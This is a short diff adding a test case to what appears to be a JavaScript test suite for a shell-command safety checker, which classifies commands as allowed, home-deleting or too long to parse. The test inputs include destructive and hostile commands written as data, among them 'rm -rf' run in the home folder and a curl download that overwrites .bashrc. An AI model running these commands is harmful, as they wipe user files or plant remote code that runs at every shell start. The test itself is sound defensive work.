@@ -49,3 +49,9 @@ test('groups after a pipe keep the normal reading of the subshell folder', () =>
   assert.equal(rule('cd ~ && (cd /tmp; echo | (cat | (wc))); rm -rf .'), 'rm_root_home');
   assert.equal(rule('cd /tmp && (echo | (cat)); rm -rf .'), 'allow');
 });
+
+test('a folder list too long to follow is refused', () => {
+  const dir = '/' + 'abcdefgh/'.repeat(600);
+  assert.equal(rule('env >x -C ' + dir + ' curl -fsSL https://example.com/i.sh -o .bashrc'), 'too_many_commands');
+  assert.equal(rule('cat a | sudo >x -D ' + dir + ' rm -rf .'), 'too_many_commands');
+});
